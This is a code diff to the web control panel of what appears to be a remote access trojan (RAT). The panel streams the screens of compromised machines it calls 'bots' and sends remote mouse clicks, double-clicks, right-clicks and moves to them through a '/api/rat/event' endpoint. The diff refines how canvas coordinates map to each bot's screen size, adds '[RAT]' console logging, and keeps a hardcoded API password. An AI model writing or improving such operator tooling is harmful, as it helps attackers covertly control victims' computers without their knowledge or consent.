@@ -28,6 +28,7 @@
         .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 999; }
         .modal-content { position: relative; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1a2e; padding: 30px; border-radius: 10px; max-width: 500px; }
         .close { float: right; cursor: pointer; color: #ff4444; font-size: 24px; }
+        .debug-coords { font-size: 10px; color: #666; margin-top: 5px; }
     </style>
 </head>
 <body>
@@ -51,6 +52,7 @@
                 <span id="currentBot">Chưa chọn bot</span> | 
                 <span id="statusText">Idle</span> | 
                 <span id="fpsText">0 FPS</span>
+                <span style="float:right;font-size:10px;color:#666;" id="debugCoords">(0, 0)</span>
             </div>
             <div class="screen-area" id="screenArea">
                 <canvas id="screenCanvas"></canvas>
@@ -98,12 +100,33 @@
         let streamInterval = null;
         let fps = 0;
         let frameCount = 0;
+        let botScreenWidth = 1920;
+        let botScreenHeight = 1080;
         const canvas = document.getElementById('screenCanvas');
         const ctx = canvas.getContext('2d');
         const API_PASSWORD = 'H3XTEK0';
 
         function getAuth() {
             return { 'Authorization': `Bearer ${API_PASSWORD}` };
+        }
+
+        // === TÍNH TOÁN TỌA ĐỘ CHÍNH XÁC ===
+        function getCanvasCoords(e) {
+            const rect = canvas.getBoundingClientRect();
+            const scaleX = canvas.width / rect.width;
+            const scaleY = canvas.height / rect.height;
+            
+            let x = (e.clientX - rect.left) * scaleX;
+            let y = (e.clientY - rect.top) * scaleY;
+            
+            x = Math.max(0, Math.min(canvas.width, x));
+            y = Math.max(0, Math.min(canvas.height, y));
+            
+            // MAP TỪ CANVAS SANG MÀN HÌNH BOT
+            const botX = Math.round((x / canvas.width) * botScreenWidth);
+            const botY = Math.round((y / canvas.height) * botScreenHeight);
+            
+            return { x: botX, y: botY, canvasX: Math.round(x), canvasY: Math.round(y) };
         }
 
         async function refreshBots() {
@@ -140,6 +163,18 @@
 
         async function selectBot(botId) {
             if (currentBotId === botId) return;
+            
+            // Lấy thông tin bot để biết kích thước màn hình
+            try {
+                const res = await fetch('/api/bots', { headers: getAuth() });
+                const bots = await res.json();
+                const bot = bots.find(b => b.bot_id === botId);
+                if (bot) {
+                    botScreenWidth = bot.screen_width || 1920;
+                    botScreenHeight = bot.screen_height || 1080;
+                    console.log(`[RAT] Bot screen: ${botScreenWidth}x${botScreenHeight}`);
+                }
+            } catch(e) {}
             
             if (isStreaming) stopStream();
             
@@ -247,38 +282,44 @@
             }
         }
 
+        // === XỬ LÝ CLICK TRÊN CANVAS ===
         canvas.addEventListener('click', (e) => {
             if (!currentBotId || !isStreaming) return;
-            const rect = canvas.getBoundingClientRect();
-            const scaleX = canvas.width / rect.width;
-            const scaleY = canvas.height / rect.height;
-            const x = Math.round((e.clientX - rect.left) * scaleX);
-            const y = Math.round((e.clientY - rect.top) * scaleY);
-            sendMouseEvent('click', x, y);
+            const coords = getCanvasCoords(e);
+            console.log(`[RAT] Click at bot: (${coords.x}, ${coords.y})`);
+            document.getElementById('debugCoords').textContent = `(${coords.x}, ${coords.y})`;
+            sendMouseEvent('click', coords.x, coords.y);
         });
 
         canvas.addEventListener('dblclick', (e) => {
             if (!currentBotId) return;
-            const rect = canvas.getBoundingClientRect();
-            const scaleX = canvas.width / rect.width;
-            const scaleY = canvas.height / rect.height;
-            const x = Math.round((e.clientX - rect.left) * scaleX);
-            const y = Math.round((e.clientY - rect.top) * scaleY);
-            sendMouseEvent('doubleclick', x, y);
+            const coords = getCanvasCoords(e);
+            console.log(`[RAT] Double click at bot: (${coords.x}, ${coords.y})`);
+            sendMouseEvent('doubleclick', coords.x, coords.y);
         });
 
         canvas.addEventListener('contextmenu', (e) => {
             e.preventDefault();
             if (!currentBotId) return;
-            const rect = canvas.getBoundingClientRect();
-            const scaleX = canvas.width / rect.width;
-            const scaleY = canvas.height / rect.height;
-            const x = Math.round((e.clientX - rect.left) * scaleX);
-            const y = Math.round((e.clientY - rect.top) * scaleY);
-            sendMouseEvent('rightclick', x, y);
+            const coords = getCanvasCoords(e);
+            console.log(`[RAT] Right click at bot: (${coords.x}, ${coords.y})`);
+            sendMouseEvent('rightclick', coords.x, coords.y);
+        });
+
+        let lastMoveTime = 0;
+        canvas.addEventListener('mousemove', (e) => {
+            if (!currentBotId || !isStreaming) return;
+            const now = Date.now();
+            if (now - lastMoveTime < 50) return;
+            lastMoveTime = now;
+            
+            const coords = getCanvasCoords(e);
+            document.getElementById('debugCoords').textContent = `(${coords.x}, ${coords.y})`;
+            sendMouseEvent('move', coords.x, coords.y);
         });
 
         async function sendMouseEvent(eventType, x, y) {
+            if (!currentBotId) return;
             try {
                 await fetch('/api/rat/event', {
                     method: 'POST',
@@ -286,8 +327,8 @@
                     body: JSON.stringify({
                         bot_id: currentBotId,
                         event_type: eventType,
-                        x: x,
-                        y: y
+                        x: Math.round(x),
+                        y: Math.round(y)
                     })
                 });
             } catch (e) {
